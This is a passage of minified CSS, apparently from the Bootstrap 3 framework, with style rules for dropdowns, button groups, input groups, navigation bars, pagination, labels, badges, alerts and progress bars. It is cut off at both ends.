20px;font-size:12px;line-height:1.42857143;color:#777;white-space:nowrap}.dropdown-backdrop{position:fixed;left:0;right:0;bottom:0;top:0;z-index:990}.pull-right>.dropdown-menu{right:0;left:auto}.dropup .caret,.navbar-fixed-bottom .dropdown .caret{border-top:0;border-bottom:4px dashed;border-bottom:4px solid \9;content:""}.dropup .dropdown-menu,.navbar-fixed-bottom .dropdown .dropdown-menu{top:auto;bottom:100%;margin-bottom:2px}@media (min-width:992px){.navbar-right .dropdown-menu{left:auto;right:0}.navbar-right .dropdown-menu-left{left:0;right:auto}}.btn-group,.btn-group-vertical{position:relative;display:inline-block;vertical-align:middle}.btn-group>.btn,.btn-group-vertical>.btn{position:relative;float:left}.btn-group>.btn:hover,.btn-group-vertical>.btn:hover,.btn-group>.btn:focus,.btn-group-vertical>.btn:focus,.btn-group>.btn:active,.btn-group-vertical>.btn:active,.btn-group>.btn.active,.btn-group-vertical>.btn.active{z-index:2}.btn-group .btn+.btn,.btn-group .btn+.btn-group,.btn-group .btn-group+.btn,.btn-group .btn-group+.btn-group{margin-left:-1px}.btn-toolbar{margin-left:-5px}.btn-toolbar .btn,.btn-toolbar .btn-group,.btn-toolbar .input-group{float:left}.btn-toolbar>.btn,.btn-toolbar>.btn-group,.btn-toolbar>.input-group{margin-left:5px}.btn-group>.btn:not(:first-child):not(:last-child):not(.dropdown-toggle){border-radius:0}.btn-group>.btn:first-child{margin-left:0}.btn-group>.btn:first-child:not(:last-child):not(.dropdown-toggle){border-bottom-right-radius:0;border-top-right-radius:0}.btn-group>.btn:last-child:not(:first-child),.btn-group>.dropdown-toggle:not(:first-child){border-bottom-left-radius:0;border-top-left-radius:0}.btn-group>.btn-group{float:left}.btn-group>.btn-group:not(:first-child):not(:last-child)>.btn{border-radius:0}.btn-group>.btn-group:first-child:not(:last-child)>.btn:last-child,.btn-group>.btn-group:first-child:not(:last-child)>.dropdown-toggle{border-bottom-right-radius:0;border-top-right-radius:0}.btn-group>.btn-group:last-child:not(:first-child)>.btn:first-child{border-bottom-left-radius:0;border-top-left-radius:0}.btn-group .dropdown-toggle:active,.btn-group.open .dropdown-toggle{outline:0}.btn-group>.btn+.dropdown-toggle{padding-left:8px;padding-right:8px}.btn-group>.btn-lg+.dropdown-toggle{padding-left:12px;padding-right:12px}.btn-group.open .dropdown-toggle{-webkit-box-shadow:inset 0 3px 5px rgba(0,0,0,0.125);box-shadow:inset 0 3px 5px rgba(0,0,0,0.125)}.btn-group.open .dropdown-toggle.btn-link{-webkit-box-shadow:none;box-shadow:none}.btn .caret{margin-left:0}.btn-lg .caret{border-width:5px 5px 0;border-bottom-width:0}.dropup .btn-lg .caret{border-width:0 5px 5px}.btn-group-vertical>.btn,.btn-group-vertical>.btn-group,.btn-group-vertical>.btn-group>.btn{display:block;float:none;width:100%;max-width:100%}.btn-group-vertical>.btn-group>.btn{float:none}.btn-group-vertical>.btn+.btn,.btn-group-vertical>.btn+.btn-group,.btn-group-vertical>.btn-group+.btn,.btn-group-vertical>.btn-group+.btn-group{margin-top:-1px;margin-left:0}.btn-group-vertical>.btn:not(:first-child):not(:last-child){border-radius:0}.btn-group-vertical>.btn:first-child:not(:last-child){border-top-right-radius:4px;border-top-left-radius:4px;border-bottom-right-radius:0;border-bottom-left-radius:0}.btn-group-vertical>.btn:last-child:not(:first-child){border-top-right-radius:0;border-top-left-radius:0;border-bottom-right-radius:4px;border-bottom-left-radius:4px}.btn-group-vertical>.btn-group:not(:first-child):not(:last-child)>.btn{border-radius:0}.btn-group-vertical>.btn-group:first-child:not(:last-child)>.btn:last-child,.btn-group-vertical>.btn-group:first-child:not(:last-child)>.dropdown-toggle{border-bottom-right-radius:0;border-bottom-left-radius:0}.btn-group-vertical>.btn-group:last-child:not(:first-child)>.btn:first-child{border-top-right-radius:0;border-top-left-radius:0}.btn-group-justified{display:table;width:100%;table-layout:fixed;border-collapse:separate}.btn-group-justified>.btn,.btn-group-justified>.btn-group{float:none;display:table-cell;width:1%}.btn-group-justified>.btn-group .btn{width:100%}.btn-group-justified>.btn-group .dropdown-menu{left:auto}[data-toggle="buttons"]>.btn input[type="radio"],[data-toggle="buttons"]>.btn-group>.btn input[type="radio"],[data-toggle="buttons"]>.btn input[type="checkbox"],[data-toggle="buttons"]>.btn-group>.btn input[type="checkbox"]{position:absolute;clip:rect(0, 0, 0, 0);pointer-events:none}.input-group{position:relative;display:table;border-collapse:separate}.input-group[class*="col-"]{float:none;padding-left:0;padding-right:0}.input-group .form-control{position:relative;z-index:2;float:left;width:100%;margin-bottom:0}.input-group .form-control:focus{z-index:3}.input-group-lg>.form-control,.input-group-lg>.input-group-addon,.input-group-lg>.input-group-btn>.btn{height:46px;padding:10px 16px;font-size:18px;line-height:1.3333333;border-radius:6px}select.input-group-lg>.form-control,select.input-group-lg>.input-group-addon,select.input-group-lg>.input-group-btn>.btn{height:46px;line-height:46px}textarea.input-group-lg>.form-control,textarea.input-group-lg>.input-group-addon,textarea.input-group-lg>.input-group-btn>.btn,select[multiple].input-group-lg>.form-control,select[multiple].input-group-lg>.input-group-addon,select[multiple].input-group-lg>.input-group-btn>.btn{height:auto}.input-group-sm>.form-control,.input-group-sm>.input-group-addon,.input-group-sm>.input-group-btn>.btn{height:30px;padding:5px 10px;font-size:12px;line-height:1.5;border-radius:3px}select.input-group-sm>.form-control,select.input-group-sm>.input-group-addon,select.input-group-sm>.input-group-btn>.btn{height:30px;line-height:30px}textarea.input-group-sm>.form-control,textarea.input-group-sm>.input-group-addon,textarea.input-group-sm>.input-group-btn>.btn,select[multiple].input-group-sm>.form-control,select[multiple].input-group-sm>.input-group-addon,select[multiple].input-group-sm>.input-group-btn>.btn{height:auto}.input-group-addon,.input-group-btn,.input-group .form-control{display:table-cell}.input-group-addon:not(:first-child):not(:last-child),.input-group-btn:not(:first-child):not(:last-child),.input-group .form-control:not(:first-child):not(:last-child){border-radius:0}.input-group-addon,.input-group-btn{width:1%;white-space:nowrap;vertical-align:middle}.input-group-addon{padding:6px 12px;font-size:14px;font-weight:normal;line-height:1;color:#555;text-align:center;background-color:#eee;border:1px solid #ccc;border-radius:4px}.input-group-addon.input-sm{padding:5px 10px;font-size:12px;border-radius:3px}.input-group-addon.input-lg{padding:10px 16px;font-size:18px;border-radius:6px}.input-group-addon input[type="radio"],.input-group-addon input[type="checkbox"]{margin-top:0}.input-group .form-control:first-child,.input-group-addon:first-child,.input-group-btn:first-child>.btn,.input-group-btn:first-child>.btn-group>.btn,.input-group-btn:first-child>.dropdown-toggle,.input-group-btn:last-child>.btn:not(:last-child):not(.dropdown-toggle),.input-group-btn:last-child>.btn-group:not(:last-child)>.btn{border-bottom-right-radius:0;border-top-right-radius:0}.input-group-addon:first-child{border-right:0}.input-group .form-control:last-child,.input-group-addon:last-child,.input-group-btn:last-child>.btn,.input-group-btn:last-child>.btn-group>.btn,.input-group-btn:last-child>.dropdown-toggle,.input-group-btn:first-child>.btn:not(:first-child),.input-group-btn:first-child>.btn-group:not(:first-child)>.btn{border-bottom-left-radius:0;border-top-left-radius:0}.input-group-addon:last-child{border-left:0}.input-group-btn{position:relative;font-size:0;white-space:nowrap}.input-group-btn>.btn{position:relative}.input-group-btn>.btn+.btn{margin-left:-1px}.input-group-btn>.btn:hover,.input-group-btn>.btn:focus,.input-group-btn>.btn:active{z-index:2}.input-group-btn:first-child>.btn,.input-group-btn:first-child>.btn-group{margin-right:-1px}.input-group-btn:last-child>.btn,.input-group-btn:last-child>.btn-group{z-index:2;margin-left:-1px}.nav{margin-bottom:0;padding-left:0;list-style:none}.nav>li{position:relative;display:block}.nav>li>a{position:relative;display:block;padding:10px 15px}.nav>li>a:hover,.nav>li>a:focus{text-decoration:none;background-color:#eee}.nav>li.disabled>a{color:#777}.nav>li.disabled>a:hover,.nav>li.disabled>a:focus{color:#777;text-decoration:none;background-color:transparent;cursor:not-allowed}.nav .open>a,.nav .open>a:hover,.nav .open>a:focus{background-color:#eee;border-color:#337ab7}.nav .nav-divider{height:1px;margin:9px 0;overflow:hidden;background-color:#e5e5e5}.nav>li>a>img{max-width:none}.nav-tabs{border-bottom:1px solid #ddd}.nav-tabs>li{float:left;margin-bottom:-1px}.nav-tabs>li>a{margin-right:2px;line-height:1.42857143;border:1px solid transparent;border-radius:4px 4px 0 0}.nav-tabs>li>a:hover{border-color:#eee #eee #ddd}.nav-tabs>li.active>a,.nav-tabs>li.active>a:hover,.nav-tabs>li.active>a:focus{color:#555;background-color:#fff;border:1px solid #ddd;border-bottom-color:transparent;cursor:default}.nav-tabs.nav-justified{width:100%;border-bottom:0}.nav-tabs.nav-justified>li{float:none}.nav-tabs.nav-justified>li>a{text-align:center;margin-bottom:5px}.nav-tabs.nav-justified>.dropdown .dropdown-menu{top:auto;left:auto}@media (min-width:768px){.nav-tabs.nav-justified>li{display:table-cell;width:1%}.nav-tabs.nav-justified>li>a{margin-bottom:0}}.nav-tabs.nav-justified>li>a{margin-right:0;border-radius:4px}.nav-tabs.nav-justified>.active>a,.nav-tabs.nav-justified>.active>a:hover,.nav-tabs.nav-justified>.active>a:focus{border:1px solid #ddd}@media (min-width:768px){.nav-tabs.nav-justified>li>a{border-bottom:1px solid #ddd;border-radius:4px 4px 0 0}.nav-tabs.nav-justified>.active>a,.nav-tabs.nav-justified>.active>a:hover,.nav-tabs.nav-justified>.active>a:focus{border-bottom-color:#fff}}.nav-pills>li{float:left}.nav-pills>li>a{border-radius:4px}.nav-pills>li+li{margin-left:2px}.nav-pills>li.active>a,.nav-pills>li.active>a:hover,.nav-pills>li.active>a:focus{color:#fff;background-color:#337ab7}.nav-stacked>li{float:none}.nav-stacked>li+li{margin-top:2px;margin-left:0}.nav-justified{width:100%}.nav-justified>li{float:none}.nav-justified>li>a{text-align:center;margin-bottom:5px}.nav-justified>.dropdown .dropdown-menu{top:auto;left:auto}@media (min-width:768px){.nav-justified>li{display:table-cell;width:1%}.nav-justified>li>a{margin-bottom:0}}.nav-tabs-justified{border-bottom:0}.nav-tabs-justified>li>a{margin-right:0;border-radius:4px}.nav-tabs-justified>.active>a,.nav-tabs-justified>.active>a:hover,.nav-tabs-justified>.active>a:focus{border:1px solid #ddd}@media (min-width:768px){.nav-tabs-justified>li>a{border-bottom:1px solid #ddd;border-radius:4px 4px 0 0}.nav-tabs-justified>.active>a,.nav-tabs-justified>.active>a:hover,.nav-tabs-justified>.active>a:focus{border-bottom-color:#fff}}.tab-content>.tab-pane{display:none}.tab-content>.active{display:block}.nav-tabs .dropdown-menu{margin-top:-1px;border-top-right-radius:0;border-top-left-radius:0}.navbar{position:relative;min-height:50px;margin-bottom:20px;border:1px solid transparent}@media (min-width:992px){.navbar{border-radius:4px}}@media (min-width:992px){.navbar-header{float:left}}.navbar-collapse{overflow-x:visible;padding-right:15px;padding-left:15px;border-top:1px solid transparent;-webkit-box-shadow:inset 0 1px 0 rgba(255,255,255,0.1);box-shadow:inset 0 1px 0 rgba(255,255,255,0.1);-webkit-overflow-scrolling:touch}.navbar-collapse.in{overflow-y:auto}@media (min-width:992px){.navbar-collapse{width:auto;border-top:0;-webkit-box-shadow:none;box-shadow:none}.navbar-collapse.collapse{display:block !important;height:auto !important;padding-bottom:0;overflow:visible !important}.navbar-collapse.in{overflow-y:visible}.navbar-fixed-top .navbar-collapse,.navbar-static-top .navbar-collapse,.navbar-fixed-bottom .navbar-collapse{padding-left:0;padding-right:0}}.navbar-fixed-top .navbar-collapse,.navbar-fixed-bottom .navbar-collapse{max-height:340px}@media (max-device-width:480px) and (orientation:landscape){.navbar-fixed-top .navbar-collapse,.navbar-fixed-bottom .navbar-collapse{max-height:200px}}.container>.navbar-header,.container-fluid>.navbar-header,.container>.navbar-collapse,.container-fluid>.navbar-collapse{margin-right:-15px;margin-left:-15px}@media (min-width:992px){.container>.navbar-header,.container-fluid>.navbar-header,.container>.navbar-collapse,.container-fluid>.navbar-collapse{margin-right:0;margin-left:0}}.navbar-static-top{z-index:1000;border-width:0 0 1px}@media (min-width:992px){.navbar-static-top{border-radius:0}}.navbar-fixed-top,.navbar-fixed-bottom{position:fixed;right:0;left:0;z-index:1030}@media (min-width:992px){.navbar-fixed-top,.navbar-fixed-bottom{border-radius:0}}.navbar-fixed-top{top:0;border-width:0 0 1px}.navbar-fixed-bottom{bottom:0;margin-bottom:0;border-width:1px 0 0}.navbar-brand{float:left;padding:15px 15px;font-size:18px;line-height:20px;height:50px}.navbar-brand:hover,.navbar-brand:focus{text-decoration:none}.navbar-brand>img{display:block}@media (min-width:992px){.navbar>.container .navbar-brand,.navbar>.container-fluid .navbar-brand{margin-left:-15px}}.navbar-toggle{position:relative;float:right;margin-right:15px;padding:9px 10px;margin-top:8px;margin-bottom:8px;background-color:transparent;background-image:none;border:1px solid transparent;border-radius:4px}.navbar-toggle:focus{outline:0}.navbar-toggle .icon-bar{display:block;width:22px;height:2px;border-radius:1px}.navbar-toggle .icon-bar+.icon-bar{margin-top:4px}@media (min-width:992px){.navbar-toggle{display:none}}.navbar-nav{margin:7.5px -15px}.navbar-nav>li>a{padding-top:10px;padding-bottom:10px;line-height:20px}@media (max-width:991px){.navbar-nav .open .dropdown-menu{position:static;float:none;width:auto;margin-top:0;background-color:transparent;border:0;-webkit-box-shadow:none;box-shadow:none}.navbar-nav .open .dropdown-menu>li>a,.navbar-nav .open .dropdown-menu .dropdown-header{padding:5px 15px 5px 25px}.navbar-nav .open .dropdown-menu>li>a{line-height:20px}.navbar-nav .open .dropdown-menu>li>a:hover,.navbar-nav .open .dropdown-menu>li>a:focus{background-image:none}}@media (min-width:992px){.navbar-nav{float:left;margin:0}.navbar-nav>li{float:left}.navbar-nav>li>a{padding-top:15px;padding-bottom:15px}}.navbar-form{margin-left:-15px;margin-right:-15px;padding:10px 15px;border-top:1px solid transparent;border-bottom:1px solid transparent;-webkit-box-shadow:inset 0 1px 0 rgba(255,255,255,0.1),0 1px 0 rgba(255,255,255,0.1);box-shadow:inset 0 1px 0 rgba(255,255,255,0.1),0 1px 0 rgba(255,255,255,0.1);margin-top:8px;margin-bottom:8px}@media (min-width:768px){.navbar-form .form-group{display:inline-block;margin-bottom:0;vertical-align:middle}.navbar-form .form-control{display:inline-block;width:auto;vertical-align:middle}.navbar-form .form-control-static{display:inline-block}.navbar-form .input-group{display:inline-table;vertical-align:middle}.navbar-form .input-group .input-group-addon,.navbar-form .input-group .input-group-btn,.navbar-form .input-group .form-control{width:auto}.navbar-form .input-group>.form-control{width:100%}.navbar-form .control-label{margin-bottom:0;vertical-align:middle}.navbar-form .radio,.navbar-form .checkbox{display:inline-block;margin-top:0;margin-bottom:0;vertical-align:middle}.navbar-form .radio label,.navbar-form .checkbox label{padding-left:0}.navbar-form .radio input[type="radio"],.navbar-form .checkbox input[type="checkbox"]{position:relative;margin-left:0}.navbar-form .has-feedback .form-control-feedback{top:0}}@media (max-width:991px){.navbar-form .form-group{margin-bottom:5px}.navbar-form .form-group:last-child{margin-bottom:0}}@media (min-width:992px){.navbar-form{width:auto;border:0;margin-left:0;margin-right:0;padding-top:0;padding-bottom:0;-webkit-box-shadow:none;box-shadow:none}}.navbar-nav>li>.dropdown-menu{margin-top:0;border-top-right-radius:0;border-top-left-radius:0}.navbar-fixed-bottom .navbar-nav>li>.dropdown-menu{margin-bottom:0;border-top-right-radius:4px;border-top-left-radius:4px;border-bottom-right-radius:0;border-bottom-left-radius:0}.navbar-btn{margin-top:8px;margin-bottom:8px}.navbar-btn.btn-sm{margin-top:10px;margin-bottom:10px}.navbar-btn.btn-xs{margin-top:14px;margin-bottom:14px}.navbar-text{margin-top:15px;margin-bottom:15px}@media (min-width:992px){.navbar-text{float:left;margin-left:15px;margin-right:15px}}@media (min-width:992px){.navbar-left{float:left !important}.navbar-right{float:right !important;margin-right:-15px}.navbar-right~.navbar-right{margin-right:0}}.navbar-default{background-color:#f8f8f8;border-color:#e7e7e7}.navbar-default .navbar-brand{color:#777}.navbar-default .navbar-brand:hover,.navbar-default .navbar-brand:focus{color:#5e5e5e;background-color:transparent}.navbar-default .navbar-text{color:#777}.navbar-default .navbar-nav>li>a{color:#777}.navbar-default .navbar-nav>li>a:hover,.navbar-default .navbar-nav>li>a:focus{color:#333;background-color:transparent}.navbar-default .navbar-nav>.active>a,.navbar-default .navbar-nav>.active>a:hover,.navbar-default .navbar-nav>.active>a:focus{color:#555;background-color:#e7e7e7}.navbar-default .navbar-nav>.disabled>a,.navbar-default .navbar-nav>.disabled>a:hover,.navbar-default .navbar-nav>.disabled>a:focus{color:#ccc;background-color:transparent}.navbar-default .navbar-toggle{border-color:#ddd}.navbar-default .navbar-toggle:hover,.navbar-default .navbar-toggle:focus{background-color:#ddd}.navbar-default .navbar-toggle .icon-bar{background-color:#888}.navbar-default .navbar-collapse,.navbar-default .navbar-form{border-color:#e7e7e7}.navbar-default .navbar-nav>.open>a,.navbar-default .navbar-nav>.open>a:hover,.navbar-default .navbar-nav>.open>a:focus{background-color:#e7e7e7;color:#555}@media (max-width:991px){.navbar-default .navbar-nav .open .dropdown-menu>li>a{color:#777}.navbar-default .navbar-nav .open .dropdown-menu>li>a:hover,.navbar-default .navbar-nav .open .dropdown-menu>li>a:focus{color:#333;background-color:transparent}.navbar-default .navbar-nav .open .dropdown-menu>.active>a,.navbar-default .navbar-nav .open .dropdown-menu>.active>a:hover,.navbar-default .navbar-nav .open .dropdown-menu>.active>a:focus{color:#555;background-color:#e7e7e7}.navbar-default .navbar-nav .open .dropdown-menu>.disabled>a,.navbar-default .navbar-nav .open .dropdown-menu>.disabled>a:hover,.navbar-default .navbar-nav .open .dropdown-menu>.disabled>a:focus{color:#ccc;background-color:transparent}}.navbar-default .navbar-link{color:#777}.navbar-default .navbar-link:hover{color:#333}.navbar-default .btn-link{color:#777}.navbar-default .btn-link:hover,.navbar-default .btn-link:focus{color:#333}.navbar-default .btn-link[disabled]:hover,fieldset[disabled] .navbar-default .btn-link:hover,.navbar-default .btn-link[disabled]:focus,fieldset[disabled] .navbar-default .btn-link:focus{color:#ccc}.navbar-inverse{background-color:#222;border-color:#080808}.navbar-inverse .navbar-brand{color:#9d9d9d}.navbar-inverse .navbar-brand:hover,.navbar-inverse .navbar-brand:focus{color:#fff;background-color:transparent}.navbar-inverse .navbar-text{color:#9d9d9d}.navbar-inverse .navbar-nav>li>a{color:#9d9d9d}.navbar-inverse .navbar-nav>li>a:hover,.navbar-inverse .navbar-nav>li>a:focus{color:#fff;background-color:transparent}.navbar-inverse .navbar-nav>.active>a,.navbar-inverse .navbar-nav>.active>a:hover,.navbar-inverse .navbar-nav>.active>a:focus{color:#fff;background-color:#080808}.navbar-inverse .navbar-nav>.disabled>a,.navbar-inverse .navbar-nav>.disabled>a:hover,.navbar-inverse .navbar-nav>.disabled>a:focus{color:#444;background-color:transparent}.navbar-inverse .navbar-toggle{border-color:#333}.navbar-inverse .navbar-toggle:hover,.navbar-inverse .navbar-toggle:focus{background-color:#333}.navbar-inverse .navbar-toggle .icon-bar{background-color:#fff}.navbar-inverse .navbar-collapse,.navbar-inverse .navbar-form{border-color:#101010}.navbar-inverse .navbar-nav>.open>a,.navbar-inverse .navbar-nav>.open>a:hover,.navbar-inverse .navbar-nav>.open>a:focus{background-color:#080808;color:#fff}@media (max-width:991px){.navbar-inverse .navbar-nav .open .dropdown-menu>.dropdown-header{border-color:#080808}.navbar-inverse .navbar-nav .open .dropdown-menu .divider{background-color:#080808}.navbar-inverse .navbar-nav .open .dropdown-menu>li>a{color:#9d9d9d}.navbar-inverse .navbar-nav .open .dropdown-menu>li>a:hover,.navbar-inverse .navbar-nav .open .dropdown-menu>li>a:focus{color:#fff;background-color:transparent}.navbar-inverse .navbar-nav .open .dropdown-menu>.active>a,.navbar-inverse .navbar-nav .open .dropdown-menu>.active>a:hover,.navbar-inverse .navbar-nav .open .dropdown-menu>.active>a:focus{color:#fff;background-color:#080808}.navbar-inverse .navbar-nav .open .dropdown-menu>.disabled>a,.navbar-inverse .navbar-nav .open .dropdown-menu>.disabled>a:hover,.navbar-inverse .navbar-nav .open .dropdown-menu>.disabled>a:focus{color:#444;background-color:transparent}}.navbar-inverse .navbar-link{color:#9d9d9d}.navbar-inverse .navbar-link:hover{color:#fff}.navbar-inverse .btn-link{color:#9d9d9d}.navbar-inverse .btn-link:hover,.navbar-inverse .btn-link:focus{color:#fff}.navbar-inverse .btn-link[disabled]:hover,fieldset[disabled] .navbar-inverse .btn-link:hover,.navbar-inverse .btn-link[disabled]:focus,fieldset[disabled] .navbar-inverse .btn-link:focus{color:#444}.breadcrumb{padding:8px 15px;margin-bottom:20px;list-style:none;background-color:#f5f5f5;border-radius:4px}.breadcrumb>li{display:inline-block}.breadcrumb>li+li:before{content:"/\00a0";padding:0 5px;color:#ccc}.breadcrumb>.active{color:#777}.pagination{display:inline-block;padding-left:0;margin:20px 0;border-radius:4px}.pagination>li{display:inline}.pagination>li>a,.pagination>li>span{position:relative;float:left;padding:6px 12px;line-height:1.42857143;text-decoration:none;color:#337ab7;background-color:#fff;border:1px solid #ddd;margin-left:-1px}.pagination>li:first-child>a,.pagination>li:first-child>span{margin-left:0;border-bottom-left-radius:4px;border-top-left-radius:4px}.pagination>li:last-child>a,.pagination>li:last-child>span{border-bottom-right-radius:4px;border-top-right-radius:4px}.pagination>li>a:hover,.pagination>li>span:hover,.pagination>li>a:focus,.pagination>li>span:focus{z-index:2;color:#23527c;background-color:#eee;border-color:#ddd}.pagination>.active>a,.pagination>.active>span,.pagination>.active>a:hover,.pagination>.active>span:hover,.pagination>.active>a:focus,.pagination>.active>span:focus{z-index:3;color:#fff;background-color:#337ab7;border-color:#337ab7;cursor:default}.pagination>.disabled>span,.pagination>.disabled>span:hover,.pagination>.disabled>span:focus,.pagination>.disabled>a,.pagination>.disabled>a:hover,.pagination>.disabled>a:focus{color:#777;background-color:#fff;border-color:#ddd;cursor:not-allowed}.pagination-lg>li>a,.pagination-lg>li>span{padding:10px 16px;font-size:18px;line-height:1.3333333}.pagination-lg>li:first-child>a,.pagination-lg>li:first-child>span{border-bottom-left-radius:6px;border-top-left-radius:6px}.pagination-lg>li:last-child>a,.pagination-lg>li:last-child>span{border-bottom-right-radius:6px;border-top-right-radius:6px}.pagination-sm>li>a,.pagination-sm>li>span{padding:5px 10px;font-size:12px;line-height:1.5}.pagination-sm>li:first-child>a,.pagination-sm>li:first-child>span{border-bottom-left-radius:3px;border-top-left-radius:3px}.pagination-sm>li:last-child>a,.pagination-sm>li:last-child>span{border-bottom-right-radius:3px;border-top-right-radius:3px}.pager{padding-left:0;margin:20px 0;list-style:none;text-align:center}.pager li{display:inline}.pager li>a,.pager li>span{display:inline-block;padding:5px 14px;background-color:#fff;border:1px solid #ddd;border-radius:15px}.pager li>a:hover,.pager li>a:focus{text-decoration:none;background-color:#eee}.pager .next>a,.pager .next>span{float:right}.pager .previous>a,.pager .previous>span{float:left}.pager .disabled>a,.pager .disabled>a:hover,.pager .disabled>a:focus,.pager .disabled>span{color:#777;background-color:#fff;cursor:not-allowed}.label{display:inline;padding:.2em .6em .3em;font-size:75%;font-weight:bold;line-height:1;color:#fff;text-align:center;white-space:nowrap;vertical-align:baseline;border-radius:.25em}a.label:hover,a.label:focus{color:#fff;text-decoration:none;cursor:pointer}.label:empty{display:none}.btn .label{position:relative;top:-1px}.label-default{background-color:#777}.label-default[href]:hover,.label-default[href]:focus{background-color:#5e5e5e}.label-primary{background-color:#337ab7}.label-primary[href]:hover,.label-primary[href]:focus{background-color:#286090}.label-success{background-color:#5cb85c}.label-success[href]:hover,.label-success[href]:focus{background-color:#449d44}.label-info{background-color:#5bc0de}.label-info[href]:hover,.label-info[href]:focus{background-color:#31b0d5}.label-warning{background-color:#f0ad4e}.label-warning[href]:hover,.label-warning[href]:focus{background-color:#ec971f}.label-danger{background-color:#d9534f}.label-danger[href]:hover,.label-danger[href]:focus{background-color:#c9302c}.badge{display:inline-block;min-width:10px;padding:3px 7px;font-size:12px;font-weight:bold;color:#fff;line-height:1;vertical-align:middle;white-space:nowrap;text-align:center;background-color:#777;border-radius:10px}.badge:empty{display:none}.btn .badge{position:relative;top:-1px}.btn-xs .badge,.btn-group-xs>.btn .badge{top:0;padding:1px 5px}a.badge:hover,a.badge:focus{color:#fff;text-decoration:none;cursor:pointer}.list-group-item.active>.badge,.nav-pills>.active>a>.badge{color:#337ab7;background-color:#fff}.list-group-item>.badge{float:right}.list-group-item>.badge+.badge{margin-right:5px}.nav-pills>li>a>.badge{margin-left:3px}.jumbotron{padding-top:30px;padding-bottom:30px;margin-bottom:30px;color:inherit;background-color:#eee}.jumbotron h1,.jumbotron .h1{color:inherit}.jumbotron p{margin-bottom:15px;font-size:21px;font-weight:200}.jumbotron>hr{border-top-color:#d5d5d5}.container .jumbotron,.container-fluid .jumbotron{border-radius:6px;padding-left:15px;padding-right:15px}.jumbotron .container{max-width:100%}@media screen and (min-width:768px){.jumbotron{padding-top:48px;padding-bottom:48px}.container .jumbotron,.container-fluid .jumbotron{padding-left:60px;padding-right:60px}.jumbotron h1,.jumbotron .h1{font-size:63px}}.thumbnail{display:block;padding:4px;margin-bottom:20px;line-height:1.42857143;background-color:#fff;border:1px solid #ddd;border-radius:4px;-webkit-transition:border .2s ease-in-out;-o-transition:border .2s ease-in-out;transition:border .2s ease-in-out}.thumbnail>img,.thumbnail a>img{margin-left:auto;margin-right:auto}a.thumbnail:hover,a.thumbnail:focus,a.thumbnail.active{border-color:#337ab7}.thumbnail .caption{padding:9px;color:#333}.alert{padding:15px;margin-bottom:20px;border:1px solid transparent;border-radius:4px}.alert h4{margin-top:0;color:inherit}.alert .alert-link{font-weight:bold}.alert>p,.alert>ul{margin-bottom:0}.alert>p+p{margin-top:5px}.alert-dismissable,.alert-dismissible{padding-right:35px}.alert-dismissable .close,.alert-dismissible .close{position:relative;top:-2px;right:-21px;color:inherit}.alert-success{background-color:#dff0d8;border-color:#d6e9c6;color:#3c763d}.alert-success hr{border-top-color:#c9e2b3}.alert-success .alert-link{color:#2b542c}.alert-info{background-color:#d9edf7;border-color:#bce8f1;color:#31708f}.alert-info hr{border-top-color:#a6e1ec}.alert-info .alert-link{color:#245269}.alert-warning{background-color:#fcf8e3;border-color:#faebcc;color:#8a6d3b}.alert-warning hr{border-top-color:#f7e1b5}.alert-warning .alert-link{color:#66512c}.alert-danger{background-color:#f2dede;border-color:#ebccd1;color:#a94442}.alert-danger hr{border-top-color:#e4b9c0}.alert-danger .alert-link{color:#843534}@-webkit-keyframes progress-bar-stripes{from{background-position:40px 0}to{background-position:0 0}}@-o-keyframes progress-bar-stripes{from{background-position:40px 0}to{background-position:0 0}}@keyframes progress-bar-stripes{from{background-position:40px 0}to{background-position:0 0}}.progress{overflow:hidden;height:20px;margin-bottom:20px;background-color:#f5f5f5;border-radius:4px;-webkit-box-shadow:inset 0 1px 2px rgba(0,0,0,0.1);box-shadow:inset 0 1px 2px rgba(0,0,0,0.1)}.progress-bar{float:left;width:0%;height:100%;font-size:12px;line-height:20px;color:#fff;text-align:center;background-color:#337ab7;-webkit-box-shadow:inset 0 -1px 0 rgba(0,0,0,0.15);box-shadow:inset 0 -1px 0 rgba(0,0,0,0.15);-webkit-transition:width .6s ease;-o-transition:width .6s ease;transition:width .6s ease}.progress-striped .progress-bar,.progress-bar-striped{background-image:-webkit-linear-gradient(45deg, rgba(255,255,255,0.15) 25%, transparent 25%, transparent 50%, rgba(255,255,255,0.15) 50%, rgba(255,255,255,0.15) 75%, transparent 75%, transparent);background-image:-o-linear-gradient(45deg, rgba(255,255,255,0.15) 25%, transparent 25%, transparent 50%, rgba(255,255,255,0.15) 50%, rgba(255,255,255,0.15) 75%, transparent 75%, transparent);background-image:linear-gradient(45deg, rgba(255,255,255,0.15) 25%, transparent 25%, transparent 50%, rgba(255,255,255,0.15) 50%, rgba(255,255,255,0.15) 75%, transparent 75%, transparent);-webkit-background-size:40px 40px;background-size:40px 40px}.progress.active .progress-bar,.progress-bar.active{-webkit-animation:progress-bar-stripes 2s linear infinite;-o-animation:progress-bar-stripes 2s linear infinite;animation:progress-bar-stripes 2s linear infinite}.progress-bar-success{background-color:#5cb85c}.progress-striped .progress-bar-success{background-image:-webkit-linear-gradient(45deg, rgba(255,255,255,0.15) 25%, transparent 25%, transparent 50%, rgba(255,255,255,0.15) 50%, rgba(255,255,255,0.15) 75%, transparent 75%, transparent);background-image:-o-linear-gradient(45deg, rgba(255,255,255,0.15) 25%, transparent 25%, transparent 50%, rgba(255,255,255,0.15) 50%, rgba(255,255,255,0.15) 75%, transparent 75%, transparent);background-image:linear-gradient(45deg, rgba(255,255,255,0.15) 25%, transparent 25%, transparent 50%, rgba(255,255,255,0.15) 50%, rgba(255,255,255,0.15) 75%, transparent 75%, transparent)}.progress-bar-info{background-color:#5bc0de}.progress-striped .progress-bar-info{background-image:-webkit-linear-gradient(45deg, rgba(255,255,255,0.15) 25%, transparent 25%, transparent 50%, rgba(255,255,255,0.15) 50%, rgba(255,255,255,0.15) 75%, transparent 75%, transparent);background-image:-o-linear-gradient(45deg, rgba(255,255,255,0.15) 25%, transparent 25%, transparent 50%, rgba(255,255,255,0.15) 50%, rgba(255,255,255,0.15) 75%, transparent 75%, transparent);background-image:linear-gradient(45deg, rgba(255,255,255,0.15) 25%, transparent 25%, transparent 50%, rgba(255,255,255,0.15) 50%, rgba(255,255,255,0.15) 75%, transparent 75%, transparent)}.progress-bar-warning{background-color:#f0ad4e}.progress-striped .progress-bar-warning{background-image:-webkit-linear-gradient(45deg, rgba(255,255,255,0.15) 25%, transparent 25%, transparent 50%, rgba(255,255,255,0.15) 50%, rgba(255,255,255,0.15) 75%, transparent 75%, transparent);background-image:-o-linear-gradient(45deg, rgba(255,255,255,0.15) 25%, transparent 